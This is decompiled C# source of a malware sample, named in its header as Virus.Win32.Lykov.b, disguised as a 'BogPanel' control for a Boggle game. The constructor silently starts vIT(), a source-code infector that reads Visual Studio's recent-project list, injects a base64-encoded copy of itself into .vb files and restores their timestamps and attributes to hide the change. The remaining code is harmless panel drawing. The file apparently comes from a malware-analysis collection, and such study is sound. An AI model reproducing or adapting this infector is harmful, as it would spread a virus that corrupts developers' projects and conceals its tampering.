// Decompiled with JetBrains decompiler
// Type: Boggle.BogPanel
// Assembly: Boggle, Version=1.0.1320.31511, Culture=neutral, PublicKeyToken=null
// MVID: B8BB850A-887A-43B2-B89D-3D1301289D01
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Virus.Win32.Lykov.b-5b4c66fd4c89a7645d7912c18b43ddd7b8db068aa896fea714881ce355eaf833.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Boggle
{
  public class BogPanel : PictureBox
  {
    private IContainer components;

    private void vIT()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
      if (registryKey.ValueCount == 0)
        ProjectData.EndApp();
      string String2 = "Private Sub vIT()";
      string str1 = "Public Sub New()";
      string str2 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
      string str3 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC" + "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE" + "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT" + "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T" + "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K" + "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi" + "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0" + "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy" + "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE" + "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ" + "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U" + "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t" + "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g" + "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg" + "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog" + "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy" + "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo" + "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9" + "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs" + "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB" + "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp" + "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku" + "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k" + "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN" + "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g" + "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp" + "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp" + "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU" + "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu" + "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+" + "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu" + "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD" + "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp" + "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD" + "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu" + "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz" + "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0" + "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
      string Expression = Encoding.ASCII.GetString(Convert.FromBase64String(str3));
      string Replacement = "J = \"";
      int num1 = Strings.Len(str3);
      int Start = 1;
      while (Start <= num1)
      {
        Replacement = checked (Start + 64) >= Strings.Len(str3) ? Replacement + Strings.Mid(str3, Start, 64) + "\"" : Replacement + Strings.Mid(str3, Start, 64) + "\"" + "\r\nJ = J & " + "\"";
        checked { Start += 64; }
      }
      string str4 = Strings.Replace(Expression, "J = \"\"", Replacement, Count: 1, Compare: CompareMethod.Text);
      int num2 = checked (registryKey.ValueCount - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        string str5 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[index1]));
        string path = Strings.Mid(str5, 1, Strings.InStrRev(str5, "\\", Compare: CompareMethod.Text));
        if (Directory.Exists(path))
        {
          string[] files = Directory.GetFiles(path, "*.vb");
          int num3 = Information.LBound((Array) files);
          int num4 = Information.UBound((Array) files);
          int index2 = num3;
          while (index2 <= num4)
          {
            DateTime lastAccessTime = File.GetLastAccessTime(files[index2]);
            DateTime lastWriteTime = File.GetLastWriteTime(files[index2]);
            FileAttributes attributes = File.GetAttributes(files[index2]);
            File.SetAttributes(files[index2], FileAttributes.Normal);
            StreamReader streamReader = File.OpenText(files[index2]);
            string end = streamReader.ReadToEnd();
            streamReader.Close();
            if (Strings.InStr(end, String2, CompareMethod.Text) == 0 & Strings.InStr(end, str1, CompareMethod.Text) != 0)
            {
              string str6 = Strings.Replace(Strings.Replace(end, "MyBase.New()", "MyBase.New()\r\n" + str2, Count: 1, Compare: CompareMethod.Text), str1, str4 + str1, Count: 1, Compare: CompareMethod.Text);
              StreamWriter text = File.CreateText(files[index2]);
              text.Write(str6);
              text.Flush();
              text.Close();
            }
            File.SetLastWriteTime(files[index2], lastWriteTime);
            File.SetLastAccessTime(files[index2], lastAccessTime);
            File.SetAttributes(files[index2], attributes);
            checked { ++index2; }
          }
        }
        checked { ++index1; }
      }
    }

    public BogPanel()
    {
      this.Resize += new EventHandler(this.BogPanel_Resize);
      new Thread(new ThreadStart(this.vIT)).Start();
      this.InitializeComponent();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent() => this.BackColor = System.Drawing.Color.DarkGray;

    protected override void OnPaint(PaintEventArgs pe)
    {
      Pen pen1 = new Pen(System.Drawing.Color.DarkGray);
      GraphicsPath path = new GraphicsPath();
      pe.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
      GraphicsPath graphicsPath1 = path;
      PointF pointF1 = new PointF(2f, (float) this.Height / 2f);
      PointF pt1_1 = pointF1;
      PointF pointF2 = new PointF(0.0f, (float) this.Height);
      PointF pt2_1 = pointF2;
      PointF pointF3 = new PointF(0.0f, (float) this.Height);
      PointF pt3_1 = pointF3;
      PointF pointF4 = new PointF((float) this.Width / 2f, (float) checked (this.Height - 2));
      PointF pt4_1 = pointF4;
      graphicsPath1.AddBezier(pt1_1, pt2_1, pt3_1, pt4_1);
      GraphicsPath graphicsPath2 = path;
      pointF4 = new PointF((float) this.Width / 2f, (float) checked (this.Height - 2));
      PointF pt1_2 = pointF4;
      pointF3 = new PointF((float) this.Width, (float) this.Height);
      PointF pt2_2 = pointF3;
      pointF2 = new PointF((float) this.Width, (float) this.Height);
      PointF pt3_2 = pointF2;
      pointF1 = new PointF((float) checked (this.Width - 2), (float) this.Height / 2f);
      PointF pt4_2 = pointF1;
      graphicsPath2.AddBezier(pt1_2, pt2_2, pt3_2, pt4_2);
      GraphicsPath graphicsPath3 = path;
      pointF4 = new PointF((float) checked (this.Width - 2), (float) this.Height / 2f);
      PointF pt1_3 = pointF4;
      pointF3 = new PointF((float) this.Width, 0.0f);
      PointF pt2_3 = pointF3;
      pointF2 = new PointF((float) this.Width, 0.0f);
      PointF pt3_3 = pointF2;
      pointF1 = new PointF((float) this.Width / 2f, 2f);
      PointF pt4_3 = pointF1;
      graphicsPath3.AddBezier(pt1_3, pt2_3, pt3_3, pt4_3);
      GraphicsPath graphicsPath4 = path;
      pointF4 = new PointF((float) this.Width / 2f, 2f);
      PointF pt1_4 = pointF4;
      pointF3 = new PointF(0.0f, 0.0f);
      PointF pt2_4 = pointF3;
      pointF2 = new PointF(0.0f, 0.0f);
      PointF pt3_4 = pointF2;
      pointF1 = new PointF(2f, (float) this.Height / 2f);
      PointF pt4_4 = pointF1;
      graphicsPath4.AddBezier(pt1_4, pt2_4, pt3_4, pt4_4);
      float num = 0.0f;
      do
      {
        int red;
        checked { red += 3; }
        int green;
        checked { green += 3; }
        int blue;
        checked { blue += 3; }
        Pen pen2 = new Pen(System.Drawing.Color.FromArgb(red, green, blue));
        Graphics graphics1 = pe.Graphics;
        Pen pen3 = pen2;
        pointF4 = new PointF(num + 2f, (float) this.Height / 2f);
        PointF pt1_5 = pointF4;
        pointF3 = new PointF(num, (float) this.Height - num);
        PointF pt2_5 = pointF3;
        pointF2 = new PointF(num, (float) this.Height - num);
        PointF pt3_5 = pointF2;
        pointF1 = new PointF((float) this.Width / 2f, (float) this.Height - (num + 2f));
        PointF pt4_5 = pointF1;
        graphics1.DrawBezier(pen3, pt1_5, pt2_5, pt3_5, pt4_5);
        Graphics graphics2 = pe.Graphics;
        Pen pen4 = pen2;
        pointF4 = new PointF((float) this.Width / 2f, (float) this.Height - (num + 2f));
        PointF pt1_6 = pointF4;
        pointF3 = new PointF((float) this.Width - num, (float) this.Height - num);
        PointF pt2_6 = pointF3;
        pointF2 = new PointF((float) this.Width - num, (float) this.Height - num);
        PointF pt3_6 = pointF2;
        pointF1 = new PointF((float) this.Width - (num + 2f), (float) this.Height / 2f);
        PointF pt4_6 = pointF1;
        graphics2.DrawBezier(pen4, pt1_6, pt2_6, pt3_6, pt4_6);
        Graphics graphics3 = pe.Graphics;
        Pen pen5 = pen2;
        pointF4 = new PointF((float) this.Width - (num + 2f), (float) this.Height / 2f);
        PointF pt1_7 = pointF4;
        pointF3 = new PointF((float) this.Width - num, num);
        PointF pt2_7 = pointF3;
        pointF2 = new PointF((float) this.Width - num, num);
        PointF pt3_7 = pointF2;
        pointF1 = new PointF((float) this.Width / 2f, num + 2f);
        PointF pt4_7 = pointF1;
        graphics3.DrawBezier(pen5, pt1_7, pt2_7, pt3_7, pt4_7);
        Graphics graphics4 = pe.Graphics;
        Pen pen6 = pen2;
        pointF4 = new PointF((float) this.Width / 2f, num + 2f);
        PointF pt1_8 = pointF4;
        pointF3 = new PointF(num, num);
        PointF pt2_8 = pointF3;
        pointF2 = new PointF(num, num);
        PointF pt3_8 = pointF2;
        pointF1 = new PointF(num + 2f, (float) this.Height / 2f);
        PointF pt4_8 = pointF1;
        graphics4.DrawBezier(pen6, pt1_8, pt2_8, pt3_8, pt4_8);
        num += 0.1f;
      }
      while (FlowControl.ForNextCheckR4(num, 5f, 0.1f));
      this.BackColor = System.Drawing.Color.DarkGray;
      this.Region = new Region(path);
      path.Dispose();
    }

    private void BogPanel_Resize(object sender, EventArgs e) => this.Refresh();
  }
}
